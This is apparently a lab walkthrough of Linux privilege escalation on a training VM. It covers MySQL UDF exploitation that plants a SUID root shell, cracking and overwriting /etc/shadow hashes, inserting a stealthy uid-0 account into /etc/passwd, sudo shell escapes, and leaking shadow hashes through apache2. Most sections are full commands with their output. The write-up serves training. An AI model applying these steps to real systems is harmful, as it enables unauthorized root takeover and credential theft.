                <h2>Service Exploits - MySQL</h2>
                <p>The first challenge informs us that there is an incorrectly configured MySQL service running as root. It also tells us there is no password! Let us start a command-line client session and connect to the MySQL server as the user root.</p>
                <pre><code>user@debian:~$ mysql -u root</code></pre>
                <p>Sure enough the connection was successful. No password required!</p>
                <pre><code>mysql> SELECT USER();
+--------------------+
| USER()             |
+--------------------+
| root@localhost     |
+--------------------+</code></pre>
                <p>Next, let us see what privileges are assigned to our currently logged-in MySQL user, in our case root. Understanding these permissions will help us identify our potential next steps and what avenues are open to us for further exploiting the machine.</p>
                <pre><code>mysql> SHOW GRANTS FOR CURRENT_USER;</code></pre>
                <p>Gives the output: </p>
                <pre><code>+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
+---------------------------------------------------------------------+</code></pre>
                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518).</p>
                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518) leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
                <p>Navigate to the "/tmp" directory and create a file to hold the UDF exploit code.</p>
                <pre><code>user@debian:/tmp$ nano exploit_udf.c</code></pre>
                <p>Paste the exploit code into the file, ensure it is copied exactly, as any syntax errors will casue issues during compilation. Once you have saved the file, compile it using <strong>gcc</strong> to produce a shared object (.so) file:</p>
                <pre><code>user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc</code></pre>
                <p>Connect to the MySQL server and switch to the <strong>MySQL</strong> system database:</p>
                <pre><code>mysql> use mysql
Reading table information for completion of table and columns names
You can turn off this feature to get a quicker startup with -A
                
Database changed
mysql> </code></pre>
                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
                <pre><code>mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)</code></pre>
                <p>Load the shared object file we created eariler in to the table, "foo":</p>
                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit.so';
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Create a custom MySQL function called "do_system" that will be available for use in SQL queries. The "soname" directive tells MySQL to load the function from the shared library "exploit_udf.so":</p>
                <pre><code>mysql> create function do_system returns integer soname 'exploit_udf.so';
Query OK, 0 rows affected (0.00 sec)</code></pre>
                <p>Use the custom function to copy the "/bin/bash" binary to "/tmp/rootbash", and set the SUID bit so we can run it as root, the creator of the file, also make it executable:</p>
                <pre><code>mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+---------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
+---------------------------------------------------------------------+
|                                                                   0 |
+---------------------------------------------------------------------+
1 row in set (0.00 sec)</code></pre>
                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the eariler steps of our attack).</p>
                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
rootbash-4.1# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Two">
                <h2>Readable /etc/shadow</h2>
                <p>The "/etc/shadow" file that contains user password hashes should only be readable by root. Let us see if that is the case:</p>
                <pre><code>user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
                <p>Nope! It is readable by absolutely everyone! Let us have a look inside:</p>
                <pre><code>user@debian:~$ nano /etc/shadow
root:$6$Tb/euwmL$*********************************************</code></pre>
                <p>We have the password hash for root (I have masked it here, so you can go and look for yourself). This is likely a <strong>SHA512crypt</strong> hash, as this is the hashing algorithm commonly used in Unix-like operating systems to store password hashes in the system's "/etc/shadow" file. Let's use John the Ripper (JTR) to see if we can crack it.</p>
                <pre><code>user@local:~/path/to/john$ ./john -format=sha512crypt -wordlist=/I/am/using/rockyou.txt /path/to/saved/hash</code></pre>
                <p>Sure enough this gives us the root password. Switch back to the target machine and switch to root, using the password.</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian/home/user# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            <section id="Three">
                <h2>Writable /etc/shadow</h2>                
                <p>This technique is similar to the last. The "/etc/shadow" file should only be writable by root. In our case, we can see that it is writable by absolutely anyone, bad idea!</p>
                <pre><code>user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
                <p>In this instance we can simply replace the root user's hash with our own hash. First, create the hash:</p>
                <pre><code>user@debian:~$ mkpasswd -m sha-512 naughty123
$6$eR5nW1fZ63CE6Fy/$6g1I55XBX1ObH88mPxMI1CntZEq2mbT3BeJXkafhdjtKS.CZ2Krktglc0xOq60ByeK01ZzqMpj4Fz/H6PHlWH0</code></pre>
                <p>Replace the root user's hash with your own and switch to root:</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian/home/user# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Four">
                <h2>Writeable /etc/passwd</h2>
                <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
                <pre><code>user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd</code></pre>
                <p>This is pretty straight forward, we can simply replace the "x" password placeholder with a hash of our own for the root user. Or, we could add our own root user with a different user name. The latter is likely the better option as it is slightly more stealthy, as it does not disrupt the functionality of the existing root user. Generate a new password hash with password of your choice:</p>
                <pre><code>user@debian:~$ openssl passwd naughty
v.iwn1lhrlTpk</code></pre>
                <p>Create a new root user, in the /etc/passwd file, like so:</p>
                <pre><code>newrootuser:v.iwn1lhrlTpk:0:0:root:/root:/bin/bash</code></pre>                
                <p>Save the file, you can now simply spawn a root shell:</p>
                <pre><code>user@debian:~$ su newrootuser
Password:
root@debian:/home/user# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Five">
                <h2>Sudo - Shell Escape Sequences</h2>
                <p>Although this technique is listed fairly late in the challenge, it is actually one of the first things I would try, as it is so straight forward. If you run "sudo -l" as your currently logged in user, the system will list all of the programs that this user is allowed to run with <strong>sudo</strong> privileges. Furthermore, if the system is particularly badly configured it may allow passwordless execution of these programs. Running "sudo -l" will give you this information. Let's try it on our box and see:</p>
                <pre><code>user@debian:~$ sudo -l
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more</code></pre>
                <p>This configuration is terrible, we can run a total of eleven programs with root privileges and there is no password required in order to do so! We can even do what we like with apache2, this could well be the program running the main application being served from this server.</p>
                <p>When you find a situation like this, a great resource to use is <a href="https://gtfobins.github.io/">GTFOBins</a>. This repository is basically a list of Unix binaries that can be used to bypass local security restrictions. We know we can run any of the programs listed using "sudo". Therefore, we simply need to find a matching program in the <strong>GTFObins</strong> list that has "sudo" listed as one of its functions. I will not go through all of these programs here, but I would advise you to do each one in turn, as I did, in order to get a good feel for how this works. Let's pick a program at random, let us pick "/usr/bin/less" ("less" is a program for paging through text one screenful at a time). Search for "less" in the <strong>GTFOBins</strong> list, you will find that "sudo" is in fact listed as one the exploitable functions. Click on "Sudo". Here it will show you how to exploit this binary in order to escape the program and directly spawn a shell. Since we will be running the program as root, it will spawn a root shell and we will own the system. Let's try it out:</p>
            <pre><code>user@debian:~$ sudo less /etc/profile</code></pre>
            <p>We open "/etc/profile" (this can be any file) with <strong>less</strong> using sudo, meaning <strong>less</strong> runs with root privileges. Inside <strong>less</strong> typing "!" followed by a command runs that command in a shell. Therefore, running "!/bin/sh" will spawn a shell, with the same privileges as <strong>less</strong> which in our case is root due to sudo.</p>
                <pre><code>sh-4.1# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
                <p>There is an "extra credit" with this particular part of the challenge. We saw eariler that our low-level user could run "/usr/sbin/apache2" as root, without requiring a password. However, if you look in the <strong>GTFOBins</strong> list, you will see that this program is not listed. Therefore, the techinque already discussed, running the program as root and using that program to execute a root shell will not work here. If "/usr/sbin/apache2" was the only program listed we would need to take a different approach. Luckily we have one!</p>
                <p><strong>Reading the root hash with Apache2</strong></p>
                <p>Let's assume an example scenario where we have gained a foothold into a system and we need to escalate our privilege to root. Let us further assume that both "/etc/shadow" and "/etc/passwd" are correctly configured and we cannot, therefore, read the password hash of root. Well, if we run "sudo -l" and we see the following:</p>
                <pre><code>user@debian:~$ sudo -l
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2</code></pre>
                <p>.. we can use <strong>Apache2</strong> in order to "dump" the password hash of the root user. By executing Apache2 and passing "/etc/shadow" as a configuration file, Apache will try to parse it as a valid Apache configuration file. Apache will likely fail to start, as "/etc/shadow" is not a valid Apache configuration file and it is not in Apache's expected configuration format. This would not normally pose a security issue, as "/etc/shadow" is configured to only be readble by the root user. However, being as though we can run Apache as the root user, using sudo, Apache will, in turn, attempt to read "/etc/shadow" as root. When Apache fails to parse "/etc/shadow" it might reveal some content from the file in its error message. Let's try it and see:</p>
                <pre><code>user@debian:~$ sudo /usr/sbin/apache2 -f /etc/shadow 
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$................'</code></pre>
                <p>Sure enough it worked! Apache kindly printed the root password hash to the terminal for us. We can now attempt to crack this hash with John the Ripper.</p>
                <p>We can use format specific cracking, as we know the identifier "$6$" refers to the <strong>sha512crypt</strong> hash type. Furthermore, this is a Linux shadow file hash, modern Linux distros use <strong>sha512crypt</strong> (NB: sha512crypt are NOT the same as SHA-512). So let's try and crack this mutha:</p>
                <pre><code>user@local:~/src/john/run$ ./john --format=sha512crypt --fork=8 --wordlist={wordlist_path} {hash_file_path}</code></pre>
                <p>This was successful, but I will will not show the password here, so you can do the work yourself! We can now switch to the root user. Having done so, we will have successfully owned the system:</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian:/home/user# whoami
root</code></pre>
